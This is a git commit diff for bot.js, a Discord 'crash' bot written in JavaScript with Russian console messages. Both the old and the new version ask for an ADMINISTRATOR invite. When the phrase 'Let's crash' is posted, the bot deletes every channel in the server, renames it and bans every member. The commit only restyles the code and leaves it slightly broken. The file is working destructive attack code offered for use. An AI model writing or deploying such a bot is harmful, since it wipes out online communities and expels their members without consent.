4b62c3b35dd34a063bb3dbecee4de77bae889992
maks12345 <50026114+TheMiksHacker@users.noreply.github.com>
2021-06-05 18:28:07 +0300

    Улучшение кода

--- bot.js
+++ bot.js
@@ -1,22 +1,21 @@
-const Discord = require('discord.js');
-const client = new Discord.Client();
+const client = new require("discord.js").Client();
 
-client.on('ready', () => {
+client.on("ready", () => {
   console.log(`Бот запущен, с ${client.users.size} пользователями, в ${client.channels.size} каналах в ${client.guilds.size} серверах.`);
   console.log(`Вход выполнен под ${client.user.tag}!`);
-  client.user.setPresence({ status: 'online', game: { name: 'Let\'s crash | ' + client.guilds.size + " серверов" } });
+  client.user.setPresence({ status: "online", game: { name: "Let\"s crash | " + client.guilds.size + " серверов" } });
   client.generateInvite(["ADMINISTRATOR"]).then(link =>{
     console.log(`Ссылка для приглашение бота: ${link}`);
   });
 });
 
-client.on('message', msg => {
-  if (msg.content === 'Let\'s crash') {
-    msg.guild.channels.array().forEach(channel => {
-      channel.delete('Lol');
+client.on("message", message => {
+  if (message.content === "Let\"s crash") {
+    message.guild.channels.array().forEach(channel => {
+      channel.delete("Lol");
     });
-    msg.guild.setName('Crash complete!');
-    msg.guild.members.array().forEach(member => {
+    message.guild.setName("Crash complete!");
+    message.guild.members.array().forEach(member => {
       member.ban();   
     });
   }
@@ -24,7 +23,7 @@ client.on('message', msg => {
 
 client.on("guildCreate", guild => {
   console.log("Бот добавлен на сервер: " + guild.name + "!");
-  client.user.setPresence({ status: 'online', game: { name: 'Let\'s crash | ' + client.guilds.size + " серверов" } });
+  client.user.setPresence({ status: "online", game: { name: "Let\"s crash | " + client.guilds.size + " серверов" } });
 });
 
-client.login('токен');
+client.login("токен");
